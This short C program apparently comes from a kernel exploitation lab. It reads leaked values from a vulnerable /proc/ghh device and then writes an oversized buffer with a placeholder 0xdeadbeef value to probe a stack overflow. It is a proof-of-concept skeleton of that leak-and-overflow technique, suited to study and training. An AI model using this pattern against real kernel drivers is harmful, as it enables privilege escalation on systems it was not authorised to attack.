#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

int main() {

    int fd = open("/proc/ghh", O_RDWR);
    if (fd < 0) {
        puts("Failed to open /proc/ghh");
        exit(-1);
    }

    unsigned long leak[5];;
    read(fd, leak, sizeof(leak));

    for (int i=0; i < 5; i++)
        printf("0x%016lx\n", leak[i]);

    unsigned long payload[40] = { 0 };
    payload[4] = 0xdeadbeefdeadbeef;

    write(fd, payload, sizeof(payload));

    return 0;
}

